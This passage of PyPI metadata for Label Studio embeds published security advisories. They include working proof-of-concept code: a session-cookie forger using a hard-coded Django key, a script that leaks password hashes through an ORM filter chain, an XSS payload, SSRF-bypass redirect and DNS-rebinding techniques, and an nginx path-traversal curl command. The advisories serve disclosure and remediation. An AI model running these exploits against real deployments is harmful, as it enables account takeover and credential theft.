password hash\n        auth_user_hash = salted_hmac(\n            'django.contrib.auth.models.AbstractBaseUser.get_session_auth_hash',\n            options['user_hash'],\n            secret=key,\n            algorithm=\"sha256\"\n        ).hexdigest()\n\n        session_dict = {\n            'uid': str(uuid.uuid4()), \n            'organization_pk': options['organisation'], \n            'next_page': '/projects/', \n            'last_login': time.time(), \n            '_auth_user_id': options['user_id'], \n            '_auth_user_backend': \n            'django.contrib.auth.backends.ModelBackend', \n            '_auth_user_hash': auth_user_hash, \n            'keep_me_logged_in': True, \n            '_session_expiry': 600\n        }\n\n        # Creates a forged session token\n        session_token = signing.dumps(\n            session_dict,\n            key=key,\n            salt=\"django.contrib.sessions.backends.signed_cookies\",\n            compress=True\n        )\n\n        self.stdout.write(\n            self.style.SUCCESS(f\"session token: {session_token}\")\n        )\n```\n\n3. Next run the following command replacing the `{user_id}` with the user ID of the account you want to the impersonate and `{user_hash}` with the victim's password hash. Copy the session token that is printed.\n\n```python\npython3 manage.py forgecookie {user_id} '{user_hash}'\n```\n\n4. Change the `sessionid` cookie on the browser and refresh the page. Observe being authenticated as the victim user.\n\n# Impact\n\nThis vulnerability can be chained with the ORM Leak vulnerability (which was patched in [`1.9.2post0`](https://github.com/HumanSignal/label-studio/releases/tag/1.9.2.post0)) in Label Studio to impersonate any account on Label Studio. An attacker could exploit these vulnerabilities to escalate their privileges from a low privilege user to a Django Super Administrator user.\n\n# Remediation Advice\n\nIt is important to note that the hard coded `SECRET_KEY` has already been removed in Label Studio versions `>=1.8.2`. However, there has not been any public disclosure about the use of the hard coded secret key and users have not been informed about the security vulnerability.\n\nWe recommend that Human Signal to release a public disclosure about the hard coded `SECRET_KEY` to encourage users to patch to a version `>=1.8.2` to mitigate the likelihood of an attacker exploiting these vulnerabilities to impersonate all accounts on the platform.\n\n# Discovered\n- August 2023, Robert Schuh, @robbilie\n- August 2023, Alex Brown, elttam","fixed_in":["1.8.2"],"id":"GHSA-f475-x83m-rx5m","link":"https://osv.dev/vulnerability/GHSA-f475-x83m-rx5m","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47117"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2post0` and was tested on version `1.8.2`.\n\n# Overview\n\nIn all current versions of [Label Studio](https://github.com/HumanSignal/label-studio), the application allows users to insecurely set filters for filtering tasks. An attacker can construct a *filter chain* to filter tasks based on sensitive fields for all user accounts on the platform by exploiting Django's Object Relational Mapper (ORM). Since the results of query can be manipulated by the ORM filter, an attacker can leak these sensitive fields character by character. For an example, the following filter chain will task results by the password hash of an account on Label Studio.\n\n```\nfilter:tasks:updated_by__active_organization__active_users__password\n```\n\nFor consistency, this type of vulnerability will be termed as **ORM Leak** in the rest of this disclosure. \n\nIn addition, Label Studio had a hard coded secret key that an attacker can use to forge a session token of any user by exploiting this ORM Leak vulnerability to leak account password hashes.\n\n# Description\n\nThe following code snippet from the `ViewSetSerializer` in [`label_studio/data_manager/serializers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/serializers.py#L115) insecurely creates `Filter` objects from a JSON `POST` request to the `/api/dm/views/{viewId}` API endpoint.\n\n```python\n    @staticmethod\n    def _create_filters(filter_group, filters_data):\n        filter_index = 0\n        for filter_data in filters_data:\n            filter_data[\"index\"] = filter_index\n            filter_group.filters.add(Filter.objects.create(**filter_data))\n            filter_index += 1\n```\n\nThese `Filter` objects are then applied in the `TaskQuerySet` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L473).\n\n```python\nclass TaskQuerySet(models.QuerySet):\n    def prepared(self, prepare_params=None):\n        \"\"\" Apply filters, ordering and selected items to queryset\n\n        :param prepare_params: prepare params with project, filters, orderings, etc\n        :return: ordered and filtered queryset\n        \"\"\"\n        from projects.models import Project\n\n        queryset = self\n\n        if prepare_params is None:\n            return queryset\n\n        project = Project.objects.get(pk=prepare_params.project)\n        request = prepare_params.request\n        queryset = apply_filters(queryset, prepare_params.filters, project, request) <1>\n        queryset = apply_ordering(queryset, prepare_params.ordering, project, request, view_data=prepare_params.data)\n\n        if not prepare_params.selectedItems:\n            return queryset\n\n        # included selected items\n        if prepare_params.selectedItems.all is False and prepare_params.selectedItems.included:\n            queryset = queryset.filter(id__in=prepare_params.selectedItems.included)\n\n        # excluded selected items\n        elif prepare_params.selectedItems.all is True and prepare_params.selectedItems.excluded:\n            queryset = queryset.exclude(id__in=prepare_params.selectedItems.excluded)\n\n        return queryset\n```\n1. User provided filters are insecurely applied here by calling the `apply_filters` that constructs the Django ORM filter.\n\nThe `PreparedTaskManager` in [`label_studio/data_manager/managers.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_manager/managers.py#L655) uses the vulnerable `TaskQuerySet` for building the Django queryset for querying `Task` objects, as shown in the following code snippet.\n\n```python\nclass PreparedTaskManager(models.Manager):\n    #...\n\n    def get_queryset(self, fields_for_evaluation=None, prepare_params=None, all_fields=False): <1>\n        \"\"\"\n        :param fields_for_evaluation: list of annotated fields in task\n        :param prepare_params: filters, ordering, selected items\n        :param all_fields: evaluate all fields for task\n        :param request: request for user extraction\n        :return: task queryset with annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"0.9.0.post3":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: MIT License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":"","project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/0.9.0.post3/","requires_dist":["pip (>=20.2.3)","appdirs (==1.4.3)","attrs (==19.1.0)","blis (==0.4.1)","certifi (==2019.11.28)","chardet (==3.0.4)","click (~=7.0)","cymem (==2.0.3)","Flask (==1.1.1)","idna (==2.8)","itsdangerous (==1.1.0)","Jinja2 (==2.10.3)","lxml (>=4.2.5)","MarkupSafe (==1.1.1)","mixpanel (==4.4.0)","numpy (>=1.17.4)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (==2.22.0)","six (>=1.13.0)","srsly (>=0.2.0)","tqdm (>=4.40.2)","urllib3 (==1.25.7)","wasabi (==0.4.2)","Werkzeug (==0.16.0)","ordered-set (==4.0.2)","orjson (>=2.0.11)","rarfile (==3.1)","flask-api (>=2.0)","pandas (>=0.24.0)","jsonschema (>=3.2.0)","xmljson (==0.2.0)","rq (>=1.0)","boto3 (>=1.12.32)","google-cloud-storage (==1.28.1)","flask-wtf (==0.14.3)","label-studio-converter (>=0.0.22)","htmlmin (==0.1.12)","gevent (>=20.6.2)","ujson (==3.0.0)","Colorama (==0.4.4)","boxing (==0.1.4)","pyyaml (>=5.3.1)"],"requires_python":">=3.5, <3.9","summary":"Label Studio annotation tool","version":"0.9.0.post3","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"d73f68ff2688d2689b9aef9ff06e5caf741ae940a3cfbe68f40e2f596dfbfe8f","md5":"a0d68c1f235ffe259b483371ef61bcce","sha256":"557622c93d59b9edfa58e0b349fa3bcf707a105101bd13df4217597c399f952d"},"downloads":-1,"filename":"label_studio-0.9.0.post3-1-py3-none-any.whl","has_sig":false,"md5_digest":"a0d68c1f235ffe259b483371ef61bcce","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.5, <3.9","size":18875169,"upload_time":"2021-01-15T00:35:03","upload_time_iso_8601":"2021-01-15T00:35:03.600558Z","url":"https://files.pythonhosted.org/packages/d7/3f/68ff2688d2689b9aef9ff06e5caf741ae940a3cfbe68f40e2f596dfbfe8f/label_studio-0.9.0.post3-1-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"e5199462cefee9af04ba62736fe82066c49b89d71c2a4f6f6c73833edd1cd65b","md5":"5ca200e0b8f6b5d5b39d8ae4bcd564f7","sha256":"defb7f52ccdef910f624eeb25bf6ce2d8fef5a372c7ab236b1017389a737148a"},"downloads":-1,"filename":"label-studio-0.9.0.post3-1.tar.gz","has_sig":false,"md5_digest":"5ca200e0b8f6b5d5b39d8ae4bcd564f7","packagetype":"sdist","python_version":"source","requires_python":">=3.5, <3.9","size":18707402,"upload_time":"2021-01-15T00:35:16","upload_time_iso_8601":"2021-01-15T00:35:16.011265Z","url":"https://files.pythonhosted.org/packages/e5/19/9462cefee9af04ba62736fe82066c49b89d71c2a4f6f6c73833edd1cd65b/label-studio-0.9.0.post3-1.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF.","fixed_in":["1.5.0.post0"],"id":"PYSEC-2022-300","link":"https://osv.dev/vulnerability/PYSEC-2022-300","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The 